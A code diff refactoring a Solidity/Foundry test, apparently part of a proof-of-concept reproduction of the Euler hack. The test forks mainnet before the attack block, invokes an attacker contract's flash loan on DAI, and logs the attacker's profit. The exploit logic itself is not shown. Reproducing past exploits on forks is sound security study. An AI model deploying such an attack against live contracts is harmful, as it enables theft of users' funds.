@@ -11,6 +11,7 @@ import {IPriceOracle} from "@aave/v3/interfaces/IPriceOracle.sol";
 import {DataTypes} from "@aave/v3/protocol/libraries/types/DataTypes.sol";
 import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
 import {Constants} from "./Constants.sol";
+import {Addresses} from "../src/libraries/Addresses.sol";
 
 contract EulerHackPoCTest is Test {
 
@@ -20,18 +21,18 @@ contract EulerHackPoCTest is Test {
     function setUp() public {
         // 1 block before the real attack otherwise the attack will fail
         vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), Constants.ATTACK_BLOCK_NUMBER - 1);
-        IPoolAddressesProvider poolAddressesProvider = IPoolAddressesProvider(Constants.POOL_ADDRESSES_PROVIDER);
+        IPoolAddressesProvider poolAddressesProvider = IPoolAddressesProvider(Addresses.POOL_ADDRESSES_PROVIDER);
         pool = IPool(poolAddressesProvider.getPool());
         attacker = new EulerHackPoC(poolAddressesProvider);
     }
 
     function test_Attack() public {
         // Get the attacker's balance before the attack
-        uint256 attackerBalanceBefore = IERC20(Constants.DAI).balanceOf(address(attacker));
+        uint256 attackerBalanceBefore = IERC20(Addresses.DAI).balanceOf(address(attacker));
         console2.log("Attacker DAI balance before:", attackerBalanceBefore / 1e18);
 
         // Get reserve data
-        DataTypes.ReserveData memory reserveData = pool.getReserveData(Constants.DAI);
+        DataTypes.ReserveData memory reserveData = pool.getReserveData(Addresses.DAI);
 
         // Calculate how much we can borrow
         IERC20 stableDebtToken = IERC20(reserveData.stableDebtTokenAddress);
@@ -43,10 +44,10 @@ contract EulerHackPoCTest is Test {
 
         // Execute the attack
         console2.log("Executing attack");
-        attacker.callFashLoan(Constants.DAI, availableForBorrowing);
+        attacker.callFashLoan(Addresses.DAI, availableForBorrowing);
 
         // Get the attacker's balance after the attack
-        uint256 attackerBalanceAfter = IERC20(Constants.DAI).balanceOf(address(attacker));
+        uint256 attackerBalanceAfter = IERC20(Addresses.DAI).balanceOf(address(attacker));
         console2.log("Attacker DAI balance after", attackerBalanceAfter / 1e18);
 
         // Check if the attack was profitable
